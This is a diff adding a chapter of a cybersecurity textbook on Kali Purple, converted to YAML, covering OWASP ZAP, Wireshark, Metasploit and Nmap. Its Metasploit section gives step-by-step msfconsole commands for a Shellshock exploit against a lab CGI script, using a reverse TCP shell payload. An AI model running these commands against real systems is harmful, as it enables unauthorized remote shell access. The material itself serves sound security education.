@@ -1,0 +1,1699 @@
+- en: '10'
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Integrating the Red Team and External Tools
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: As we begin to conclude our introduction to the Kali Purple operating system,
+    there are still a few voids here and there that we have to fill. We’ve covered
+    a robust suite of blue team tools but not all of the tools this operating system
+    has to offer are for cyber defense. In this chapter, we’re going to take a look
+    at some tools that are native to Kali Linux from before the Purple distribution
+    came into existence. We are also going to look at some very popular red team tools
+    that are compatible with Kali Linux but may not necessarily be included in a default
+    distribution.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Hopefully, you’ve invested some time within the cybersecurity community before
+    – or at least during – reading this book. If not, please do know that it’s okay
+    for you to do that! At any rate, regardless of what independent study you might
+    have enjoyed, you’ve probably noticed a few of the same brands being thrown around
+    when it comes to certain industry-related toolsets.
+  prefs: []
+  type: TYPE_NORMAL
+- en: A recent poll on the popular professional networking site, LinkedIn, pitted
+    many of the more well-known tools against each other in a *March Madness* style
+    of competitive bracket and had the community vote on their favorites until a champion
+    of sorts was announced. This unscientific and purely fun poll had **Nmap** come
+    out on top as the voted-upon favorite with **Burp Suite** a close second place
+    and each of the other tools we will discuss in this chapter ranking high – that
+    is, **Metasploit**, **Wireshark**, and **Zed Attack** **Proxy** (**ZAP**).
+  prefs: []
+  type: TYPE_NORMAL
+- en: Each of these tools has a section dedicated to it, except for Nmap, which will
+    be grouped into a section, *Scanners*, that details many different types of scanners.
+    It is worth noting that Nmap is also included in **Metasploit** – which might
+    make you wonder why Metasploit didn’t win the playful poll. It’s because sometimes,
+    people want simplicity and sometimes, they want the entire armory. It’s entirely
+    subjective and as you grow in your cyber career, you’ll adjust and sometimes change
+    your mind but ultimately begin to develop a style that is unique to you and your
+    personality.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In this chapter, we’ll cover the following topics:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: OWASP ZAP
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Wireshark
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Metasploit
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Scanners
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Password-cracking utilities
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Burp Suite
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Technical requirements
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: 'The requirements for this chapter are as follows:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**Minimum requirements**: A computing device with either the *amd64 (x86_64/64-bit)*
+    or *i386 (x86/32-bit)* architecture. It should contain at least *8 GB* of RAM.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Recommended requirements**: Based on feedback from cybersecurity field practitioners,
+    aim for the *amd64 (x86_64/64-bit)* architecture with *16 GB* of RAM – more is
+    better – and up to *64 GB* of additional disk space. Some of the applications
+    in this chapter are resource hogs and while they’ll work with the minimum requirements,
+    we can’t promise it will be smooth sailing.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: OWASP ZAP
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: We’ll begin our journey by exploring a product that was developed by the **Open
+    Web Application Security Project** (**OWASP**). This is a nonprofit organization
+    that is dedicated to improving the security of software. OWASP is a global community
+    that works to create free resources and tools, as well as standards to help organizations
+    acquire, develop, and maintain software and web applications with an emphasis
+    on security.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'OWASP specializes in generating and raising awareness concerning web application
+    security and associated risks. It provides guidance on what it considers best
+    practices for building and testing secure web applications. OWASP is known for
+    being collaborative and taking an open approach to security, focusing on transparency
+    with community-driven initiatives. Some of their activities include developing
+    security standards, organizing conferences and events, maintaining a vast repository
+    of security knowledge, and supporting various open source projects such as the
+    one we are about to discuss: ZAP.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'One of OWASP’s flagship products, ZAP is an open source web application security
+    testing tool that offers a wide range of key features that make it a versatile
+    and appealing choice for security professionals. Let’s take a look at what some
+    of those features are:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**Active and passive scanning**: ZAP offers both active and passive scanning
+    abilities for identifying potential security vulnerabilities within web applications.
+    Active scanning in this context is when ZAP actively sends requests to the target
+    application in an attempt to identify such vulnerabilities. Passive scanning,
+    on the other hand, is when ZAP monitors the traffic that is already occurring
+    between the browser and the target application to detect security vulnerabilities
+    without directly interacting with the target application.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Automated scanning**: ZAP offers automated scanners that scan web applications
+    for common vulnerabilities such as **cross-site scripting** (**XSS**) and SQL
+    injection. Having automated scanners also generates automatic vulnerability detection.
+    Like all automation, this is meant to generate efficiency, saving time and effort.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Interception and modification of HTTP requests**: ZAP allows users to intercept
+    **Hypertext Transfer Protocol** (**HTTP**) requests, a form of information that
+    travels between the browser and the application. Users could then manipulate these
+    requests and responses to test for security vulnerabilities and misconfigurations.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Fuzz testing**: Fuzz testing, or **fuzzing**, is a type of testing that allows
+    for some randomization on the part of the tester whereby they will attempt to
+    introduce invalid or unexpected information as input to an application. An example
+    might be responding with letters or special characters when the application is
+    expecting a number, or returning a negative number when such a value would be
+    illogical in a scenario. ZAP has built-in fuzzing abilities so that users can
+    test different parts of HTTP requests to find and identify potential security
+    vulnerabilities.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Support for scripting**: We’ve talked about scripting several times already.
+    It’s a powerful manner of developing automatic behaviors for many of the tools
+    we’ve discussed. ZAP supports various scripting languages, including JavaScript,
+    Ruby, and Python. While we’ve emphasized Python in this book due to its overwhelming
+    popularity and adoption in cybersecurity-related tools, and the profession itself,
+    you are not restricted to using that language if you’d like to branch out and
+    develop a skillset in a different language. JavaScript has the benefit of also
+    being popularly used in website/page development and Ruby has universal uses as
+    well.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**REST API**: We explained what both REST and API mean near the beginning of
+    [*Chapter 8*](B21223_08.xhtml#_idTextAnchor134) when we discussed **Cortex**.
+    Refer to that section if you’d like a refresher. In short, these concepts allow
+    for integration between different technologies. In other words, ZAP supports the
+    REST API so that other applications can use it to integrate with their workflows
+    and **continuous integration/continuous deployment** (**CI/CD**) pipelines.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Support for authentication**: ZAP is particularly useful in testing the authentication
+    aspects of an application. It provides support for testing through mechanisms
+    such as form-based authentication, HTTP authentication, and client certificate
+    authentication. There are authentication configuration settings within ZAP that
+    users can use to test these aspects of an application.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: ZAP should already be installed within your Kali Purple instance. To make sure,
+    let’s go through the motions of quickly grabbing a copy; if it’s already installed,
+    Kali will let us know. If not, we’ll get our copy. Alternatively, we can select
+    the Kali dragon icon in the top-left corner of our environment and either type
+    **ZAP** in the search bar or scroll down and highlight **Identify** and then move
+    our cursor to the newly expanded column on the right-hand side. Once we’ve done
+    this, we can scroll near the bottom to find and click on the **ZAP** option.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Type **sudo apt update**; if the results suggest that you upgrade, type **sudo
+    apt upgrade** to install them. Once you’re finished, type **sudo apt install zaproxy**
+    to formally install ZAP.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Let’s launch the application. To do that, type **zaproxy**. You will be asked
+    whether you want to persist the session. The decision is yours:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 10.1 – ZAP launch screen – request to persist](image/B21223_10_01.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.1 – ZAP launch screen – request to persist
+  prefs: []
+  type: TYPE_NORMAL
+- en: Persisting the session means preserving the state of ZAP as you left it. It
+    saves the state of the application, including all configurations, settings, data,
+    and activities, so that you can access and resume those activities later. Examples
+    of such settings may include scan results, whether active or passive, so that
+    they include any identified vulnerabilities, warnings, or other findings, any
+    information that was intercepted while proxying HTTP requests and responses, such
+    as headers, parameters, cookies, and content, as well as any session requests
+    that were made, scripts that were executed, or credentials and tokens that were
+    saved.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'ZAP has its own internal package updater. Whether you wish to use it is up
+    to you. We are going to select the **Update All** button at the bottom right of
+    the window:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 10.2 – ZAP launch screen – request to persist](image/B21223_10_02.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.2 – ZAP launch screen – request to persist
+  prefs: []
+  type: TYPE_NORMAL
+- en: To use ZAP, you must configure your browser so that it can use ZAP as a proxy.
+    We’ve provided instructions for doing so for both Mozilla Firefox and Google Chrome
+    because they are the two most likely web browsers you’ll experience in Kali Linux.
+    If you wish to use a different browser, a simple web search should help.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Mozilla Firefox
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'Follow these steps to configure Mozilla Firefox to use ZAP:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Launch Mozilla Firefox within your Kali Purple environment.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Open the hamburger menu at the top right.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'Select **Settings** from the drop-down menu, as shown in *Figure 10**.3*:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '![Figure 10.3 – Configuring Firefox as a proxy](image/B21223_10_03.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.3 – Configuring Firefox as a proxy
+  prefs: []
+  type: TYPE_NORMAL
+- en: Scroll the main window until you reach the **Network** **Settings** section.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'Select the **Settings…** button, as shown in *Figure 10**.4*:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '![Figure 10.4 – Accessing Firefox’s network settings](image/B21223_10_04.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.4 – Accessing Firefox’s network settings
+  prefs: []
+  type: TYPE_NORMAL
+- en: Select the **Manual proxy configuration** radio button.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Enter the host IP address in the **HTTP Proxy** field – in our case, **127.0.0.1**
+    – and enter **8080** as the value for **Port**.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Select the **Also use this proxy for** **HTTPS** box.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'Select **OK** in the bottom-right corner of the pop-up window:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '![Figure 10.5 – Adding Firefox proxy settings](image/B21223_10_05.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.5 – Adding Firefox proxy settings
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now, let’s look at Google Chrome.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Google Chrome
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'Follow these steps to configure Google Chrome to use ZAP:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Launch Google Chrome within your Kali Purple environment
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Select the vertical ellipses – that is, the three dots at the top right of the
+    Chrome browser.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'Select **Settings** from the drop-down menu, as shown in *Figure 10**.6*:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '![Figure 10.6 – Configuring Google Chrome as a proxy](image/B21223_10_06.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.6 – Configuring Google Chrome as a proxy
+  prefs: []
+  type: TYPE_NORMAL
+- en: In the left column, scroll down until you see **System** and select it.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'The main window will include new options. Select **Open your computer’s** **proxy
+    settings**:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '![Figure 10.7 – Accessing Chrome’s proxy settings](image/B21223_10_07.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.7 – Accessing Chrome’s proxy settings
+  prefs: []
+  type: TYPE_NORMAL
+- en: In the **Proxy** section, for **Automatically detect settings**, select the
+    toggle button so that it says **Off**, as shown in the top right of *Figure 10**.8*.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'For the **Use a proxy server** field, select **Set up**:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '![Figure 10.8 – Chrome’s auto-detect settings](image/B21223_10_08.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.8 – Chrome’s auto-detect settings
+  prefs: []
+  type: TYPE_NORMAL
+- en: In the pop-up box, select the toggle button for **Use a proxy server** so that
+    it says **On**.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Enter the host IP address in the **Proxy IP address** field – in our case, **127.0.0.1**
+    – and enter **8080** as the value for **Port**.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'Select **Save** in the bottom-left corner of the pop-up window:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '![Figure 10.9 – Accessing Chrome’s proxy settings](image/B21223_10_09.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.9 – Accessing Chrome’s proxy settings
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Regardless of which browser you wish to use, ensure you close the browser window
+    entirely when you’re finished and return to your ZAP instance. In the main window,
+    as shown in *Figure 10**.10*, you will notice four tiles you can choose from.
+    These are **Automated Scan**, **Manual Explore**, **Support**, and **Learn More**.
+    We highly encourage you to invest some time clicking through the links within
+    **Support** and **Learn More** to get a grasp of how ZAP works. For proof-of-concept,
+    let’s set up and run a quick automated scan:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Select the **Manual** **Explore** tile.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Add the URL address for **HTTP Proxy** that we added in the preceding step.
+    In our case, it’s **http://127.0.0.1:8080**.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Select the **Enable** **HUD** checkbox.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Ensure either the Firefox or Chrome browser is selected in the drop-down menu
+    to the right of the **Launch** **Browser** button.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'Click the **Launch** **Browser** button:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '![Figure 10.10 – Setting an attack target and launching the browser proxy](image/B21223_10_10.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.10 – Setting an attack target and launching the browser proxy
+  prefs: []
+  type: TYPE_NORMAL
+- en: Select the left angle bracket at the top left of the screen – highlighted in
+    *Figure 10**.10* – to return to the main screen.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Choose and select the **Automated** **Scan** tile.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Enter the same URL you entered in the preceding step for the **URL to** **attack**
+    field.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Ensure the **Use traditional spider** field is checked.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'Select the **Attack** button. You should see a window – under **Sent Messages**
+    – begin to populate with your automated scanning activity, as shown in *Figure
+    10**.11*:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '![Figure 10.11 – Setting the attack target and launching the browser proxy](image/B21223_10_11.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.11 – Setting the attack target and launching the browser proxy
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In this section, we talked about OWASP’s flagship product, ZAP, and how it’s
+    used for web application testing. However, testing the applications themselves
+    is only part of the overall cybersecurity puzzle. If you were to be on the receiving
+    end of an attack, analyzing the type of traffic might lead you to discover the
+    attacker’s potential tools through packet examination. You may also discover known
+    patterns or styles to help identify who is attacking or a particular method of
+    attack. Each of these things can help narrow down the objective of the attacker
+    and therefore help pinpoint where the vulnerability that might be actively exploited
+    lies. In the next section, we’re going to cover a well-known tool that’s designed
+    to take apart these communication packets and study them: Wireshark.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Wireshark
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: 'We’ve talked about Wireshark several times throughout this book. It is arguably
+    the most popular network protocol analyzer utility within the world of networking
+    and cybersecurity in use today. This tool allows its users to capture and interactively
+    navigate through the traffic running on a computer network. However, its uses
+    go beyond simple vulnerability and threat identification. Network administrators
+    can use it to monitor traffic behavior and conditions to troubleshoot any performance
+    issues and/or anomalous behavior, even if it’s not related to vulnerabilities
+    or malicious activity. Here’s a high-level overview of Wireshark’s key features:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**Packet analysis**: In short, Wireshark captures packets of information on
+    a network and displays them in a readable format, allowing users to analyze the
+    content of each packet in depth.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Live capture for offline analysis**: A nice feature of Wireshark is that
+    while users can capture the packets in real time, they can also save those packets
+    so that they can reopen them later for offline analysis. This also allows the
+    users to attach those packet capture files to emails or ticketing systems as artifact
+    evidence to support conclusions or to allow other analysts to evaluate the information
+    for comparison.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Support for multiple protocols**: Wireshark’s wide array of protocol support
+    includes protocols such as TCP, UDP, IP, HTTP, HTTPS, DNS, and others. This increases
+    the utility of Wireshark substantially as analysts can examine information that
+    supports the most common styles of network traffic.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Deep inspection**: Part of conducting a solid analysis of network traffic
+    is having the ability to drill down deeply into the individual packets that are
+    captured by Wireshark. This is where very detailed information resides. It might
+    include information such as source and destination IP addresses, the timing of
+    packets, and details that are specific to the protocols being examined.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Filtering and search**: Wireshark offers filtering capabilities that focus
+    on specific packets based on criteria such as IP addresses, protocols, and packet
+    contents. Users can also filter by searching for specific strings that might be
+    contained within the packets.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Statistics and graphs**: Wireshark offers statistical analysis tools and
+    graphs to help visualize network traffic patterns, packet distribution, and protocol
+    usage.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Color coding**: A very handy feature that Wireshark provides is the ability
+    to color-code packets based on different sets of criteria that may or may not
+    apply to the packet in question. This helps with the readability of the packet
+    capture logs and creates an avenue of efficiency for analysts to narrow down threats,
+    vulnerabilities, and/or **indicators of** **compromise** (**IoCs**).'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Customization**: The Wireshark interface is highly customizable, with the
+    user being able to set their preferences and display filters to weed out any unnecessary
+    data and narrow down the results to display only what the user deems important
+    to consider. If the user doesn’t find what they are looking for, they can easily
+    change their preferences to display the data with additional considerations or
+    to display different data altogether, even if it’s been taken from the same packet
+    capture.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Voice over IP (VoIP) analysis**: VoIP traffic is becoming more and more common
+    as businesses and individuals continue to adopt digital communications solutions.
+    Wireshark can capture VoIP packets for analysis as well! With these packets, users
+    can monitor call quality, identify VoIP protocols, and troubleshoot voice communication
+    issues.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Cross-platform compatibility**: We’ve talked about cross-platform compatibility
+    before and in the most general sense, you would usually see it as a reference
+    to an application being compatible with both Windows and Linux and maybe also
+    macOS. That is the case with Wireshark, which is compatible with all three of
+    the major operating systems.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Capture file export**: As we discussed when we talked about live capture,
+    users can save the packet capture files for future use, including offline examination,
+    for sharing with colleagues, or attaching to ticketing systems for artifact evidence.
+    These files can be saved and exported as PCAP, CSV, or plain text files.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Protocol decoding support**: Wireshark is built with the ability to decode
+    and display data from hundreds of protocols, allowing analysts to gain deep insights
+    into the network communications being examined.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Like ZAP, Wireshark should already be installed within your Kali Purple instance.
+    Let’s check this by trying to install it anew, like we did with ZAP.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Alternatively, we can select the Kali dragon icon in the top-left corner of
+    our environment and either type **Wireshark** in the search bar or scroll down
+    and highlight **Protect** and then move our cursor to the newly expanded column
+    on the right-hand side. At this point, we can scroll near the bottom to find and
+    click on the **Wireshark** option.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Otherwise, if you prefer to type, then type **sudo apt update**; if the results
+    suggest making some upgrades, type **sudo apt upgrade** to install them. Once
+    you’re finished, type **sudo apt install wireshark** to formally install Wireshark.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Let’s launch the application. To do that, type **wireshark**. When the application
+    loads, you will be asked to select the network interface you wish to capture traffic
+    from. For our working example, let’s just select the **eth0** interface; this
+    will likely be the first item in the list and already be highlighted for you.
+    Once that field is highlighted, move your cursor to the blue shark fin icon, which
+    resides directly under the word **File** at the top left, as shown in *Figure
+    10**.12*:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 10.12 – Wireshark – selecting a network interface and starting a packet
+    capture](image/B21223_10_12.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.12 – Wireshark – selecting a network interface and starting a packet
+    capture
+  prefs: []
+  type: TYPE_NORMAL
+- en: Select the **Start capturing packets** shark fin icon in the top-left corner.
+    Now, within your Kali Purple environment, load any web browser and go to any website
+    to create some traffic for Wireshark to capture. Once you’ve done this, return
+    to the Wireshark application and select the red square icon next to the shark
+    fin icon to stop capturing packets.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'You’ll immediately note that the main window fills with rows and rows of data,
+    as shown in *Figure 10**.13*. Each row is a packet capture, and they will be color-coded
+    within your environment:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 10.13 – Wireshark after collecting network packets](image/B21223_10_13.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.13 – Wireshark after collecting network packets
+  prefs: []
+  type: TYPE_NORMAL
+- en: In the lower-left window, known as the packet details pane, you’ll notice some
+    topics with arrows to the left that you can click on to expand. This will allow
+    you to do a deep dive into the information you’ve captured. In our case, the first
+    line would be the frame we’ve highlighted in the main window. The second references
+    the type of network interface we captured from, which is Ethernet II. The third
+    one tells us the IP protocol we captured – for us, it’s IPv4\. It identifies our
+    traffic as TCP traffic. However, in the process of packet capture, you will most
+    assuredly see frames with UDP listed here just as often. After that, you’ll see
+    any number of different protocols for deeper analysis, including DNS and HTTP.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Wireshark is a strongly developed application with a very long history and there
+    are an abundance of free training materials out there to help you master this
+    program if you’d like to become a packet capture and analysis guru. We’ve tossed
+    some valuable links in the *Further* *reading* section.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Wireshark helps you evaluate the angle of attack and the styles of attackers,
+    as well as what the intended target of the attacker might be. In the next section,
+    we are going to learn about one of the most robust and popular exploitation and
+    malicious payload delivery applications in the cybersecurity world today: Metasploit.
+    It is popular with pentesters and cybercriminals alike and has a robust database
+    of already prepared malicious payloads and attack styles at the ready.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Metasploit
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: 'Though mostly spoken of as a penetration testing framework, anyone who’s worked
+    in the field of cybersecurity for a year or less knows that Metasploit is also
+    one of the most popular weapons of choice in use by cybercriminals. This framework
+    comes pre-packed with cyberattacks and malicious payloads already built in. Some
+    of the other tools you’ll encounter in your cyber career are included in the Metasploit
+    framework, most notably the aforementioned Nmap. While a popular and valuable
+    penetration testing tool, make no mistake: Metasploit is an extremely vicious
+    weapon if placed into the wrong hands.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Being a core component of red teaming and pentesting, Metasploit is already
+    included in the Kali Linux distribution. You can access it by selecting the Kali
+    Purple dragon icon, as you’ve done with other utilities, scrolling down, hovering
+    your mouse over the **Exploitation Tools** field, and then selecting it from the
+    menu that expands to the right. You can also start typing **Metasploit** into
+    the search bar at the top and select it as it populates.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'But before you do this, let’s write our script. Navigate to **cgi-bin** by
+    typing **cd /usr/lib/cgi-bin**. Then, create your script file within that location
+    by typing **sudo nano metatest.sh**. Once you’re inside that file, add the following
+    lines, as shown in *Figure 10**.14*:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**#! /****bin/bash**'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**echo "****Content-type: text/html"**'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**echo " "**'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**echo "You''ve** **been Pwned!"**:'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '![Figure 10.14 – Our first Metasploit attack script](image/B21223_10_14.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.14 – Our first Metasploit attack script
+  prefs: []
+  type: TYPE_NORMAL
+- en: Before launching the actual application, let’s save our script by pressing *Ctrl*
+    + *X* to close the file and *Y* if you wish to save it (hopefully you do; otherwise,
+    you’ll have to type it all over again!). Now, return to the Kali Purple dragon
+    icon, hover your mouse over the **Exploitation Tools** field, and select **Metasploit**
+    from the menu.
+  prefs: []
+  type: TYPE_NORMAL
+- en: You can also invoke Metasploit directly from the command line. However, before
+    you do that, you should initialize the Metasploit database by typing **sudo msfdb
+    init**. The reason is that we aren’t letting you go away without having some fun.
+    We’re going to launch an exploit with Metasploit right here, right now.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Once the database has been initialized, start the beast by typing **msfconsole**
+    to invoke the application. When you do, it may take a few moments to load because
+    of its very large database of exploits and payloads, as shown in *Figure 10**.15*:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 10.15 – Metasploit initialization](image/B21223_10_15.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.15 – Metasploit initialization
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Now that Metasploit has been loaded, we are going to find and use the Shellshock
+    vulnerability. Type **search shellshock** to get a listing of all the various
+    exploits related to this vulnerability, as shown in *Figure 10**.15*. Now, we
+    need to tell Metasploit which of these exploits we intend to use. We’ll use the
+    Apache mod version. To do so, type **use exploit/multi/http/apache_mod_cgi_bash_env_exec**.
+    Now, we need to tell Metasploit who the attacking machine is and who the target
+    machine is. Type **set RHOST <target IP address>** and make sure you have permission
+    to attack this target. Try using your VM IP address like we did. Next, type **set
+    LHOST <attacker IP address>**. In our case, this will be the localhost:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 10.16 – Metasploit exploit preparation](image/B21223_10_16.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.16 – Metasploit exploit preparation
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now that we’ve told Metasploit which device to attack by setting the RHOST IP
+    address, we still need to tell it where to find the script we just created. Type
+    **set targeturi /cgi-bin/metatest.sh** and set the payload by typing **set** **payload
+    linux/x86/shell/reverse_tcp**.
+  prefs: []
+  type: TYPE_NORMAL
+- en: You can type **show options** to get an overview of all the fields within your
+    exploit that have been filled out or might still need to be filled out. When you’re
+    satisfied, type **exploit** to begin the exploit. Your terminal will notify you
+    if it was successful.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Scanners
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Each of the tools we’ve covered in this chapter thus far has a unique specialty.
+    In this section, we are going to cover a group of tools that each have a unique
+    specialty but within the same overall concept of scanning. Scanning is part of
+    the reconnaissance phase of a cyberattack. It’s where the attacker gets useful
+    information to narrow their attack vector and better plan their strategy. Different
+    scanners have different areas of emphasis. We are going to begin with the extremely
+    popular, lightweight, and time-tested Nmap network scanner.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Nmap
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: If you were to go around asking professional penetration testers to list their
+    top five favorite tools, you’d be hard-pressed to find a single one who doesn’t
+    list Nmap among them. Nmap is a very powerful network exploration tool and is
+    regularly used for security auditing. It is designed to discover network nodes
+    – hosts – along with some network-related services within a computer network.
+    In doing so, it can create a map of the network’s structure, hence the name.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Nmap uses raw IP packets to determine what hosts are available on the network,
+    which services are available on those hosts to include the application names and
+    versions, the operating system versions the hosts are running, as well as which
+    type of packet filters and firewalls are in use. This is just a high-level overview
+    that’s meant to highlight the most common uses of Nmap. It can be used to detect
+    numerous other characteristics as well.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Here are some of Nmap’s key features:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**Host discovery**: This tends to be the default visualization folks get when
+    thinking of Nmap, even though the utility is much, much more than what you are
+    about to discover. Host discovery is exactly as it sounds. Nmap sends packets
+    across the network and analyzes the responses to determine which hosts are available
+    and active on the network.'
